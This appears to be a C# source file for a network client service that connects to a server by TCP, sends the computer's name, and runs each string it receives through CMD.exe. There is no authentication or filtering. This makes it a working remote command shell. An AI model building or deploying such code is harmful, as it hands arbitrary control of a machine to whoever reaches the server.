using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SoL_client_service
{
    public class NetworkClient
    {
        /*********************************************************************
         * Main constructor.
         * When called receves
         * server's address and port.
         */
        private string ServerAddress; // Server's address (IP, domain).
        private int Port;             // Server's port.
        public NetworkClient(string ServerAddress, int Port)
        {
            //Set server's address. Will be changable via configs in future.
            this.ServerAddress = ServerAddress;
            //Set server's port. Will be changable via configs in future.
            this.Port = Port;
        }
        /*********************************************************************
         * Constructor for 
         * debugging purposes.
         * Will not be used in release.
         */
        public NetworkClient()
        {
            // Set address to localhost.
            ServerAddress = "127.0.0.1";
            // Default port - 870.
            Port = 870;
        }
        /*********************************************************************
         * Method for connecting 
         * to server. Should be running
         * in separate thread 
         * otherwise main will be blocked
         * until successful connection.
         */
        bool Connected = false;          // Connection status.
        private int RetryCooldown = 500; // Connection retry cooldown in ms. Will be changable via configs in future.
        private TcpClient client;        // TCP-socket.
        private NetworkStream nwStream;  // Network stream for exchanging data with server.
        public void Connect()
        {
            // Clear nwStream object if reconnecting.
            if (nwStream != null)
                nwStream = null;
            while (!Connected)
            {
                try
                {
                    // Get computer's system name and convert to binary format.
                    string name = Environment.MachineName;
                    byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(name);
                    // Create socket and establish connection.
                    client = new TcpClient(ServerAddress, Port);
                    nwStream = client.GetStream();
                    // Send client's name to server.
                    nwStream.Write(bytesToSend, 0, bytesToSend.Length);
                    // Read answer.
                    byte[] bytesToRead = new byte[client.ReceiveBufferSize];
                    int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);
                    // Rise connected flag.
                    Connected = true;
                }
                catch
                {
                    // If connection failed wait before another attempt.
                    Thread.Sleep(RetryCooldown);
                }
            }
        }
        /*********************************************************************
         * Method for waiting
         * server's instructions.
         */
        private void HandleServer()
        {
            while (ServiceEnabled)
            {
                try
                {
                    // Prepare to receive data.
                    byte[] buffer = new byte[client.ReceiveBufferSize];
                    // Receive data.
                    int bytesRead = nwStream.Read(buffer, 0, client.ReceiveBufferSize);
                    // If received NOTHING (in case lost connection)...
                    if (bytesRead < 1)
                        throw new Exception();
                    // Convert from binary to ASCII string.
                    string dataReceived = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                    // Perform received command.
                    System.Diagnostics.Process.Start("CMD.exe", "/C " + dataReceived);
                }
                catch
                {
                    // ...Check, if service enabled.
                    if (ServiceEnabled)
                    {
                        // Start attempting to reconnect.
                        Connected = false;
                        Connect();
                    }
                    else
                    {
                        // Otherwise abort loop in case disablence service.
                        return;
                    }
                }
            }
        }
        /*********************************************************************
         * Start service thread.
         */
        Thread Service;              // Thread for service.
        bool ServiceEnabled = false; // Service flag.
        public void StartSoLService()
        {
            // Establish connection.
            Connect();
            // Rise service flag.
            ServiceEnabled = true;
            // Create and start thread for listening server's commands.
            Service = new Thread(new ThreadStart(HandleServer));
            Service.Start();
        }

        /*********************************************************************
         * Stop service thread.
         */
        public void StopSoLService()
        {
            // Abort service thread.
            while (Service.ThreadState == ThreadState.Running)
            {
                // Abort service thread.
                Service.Abort();
                // Close connection via disposing network stream to unlock service thread from reading data.
                nwStream.Dispose();
                Thread.Sleep(500);
            }
            ServiceEnabled = false;
        }
    }
}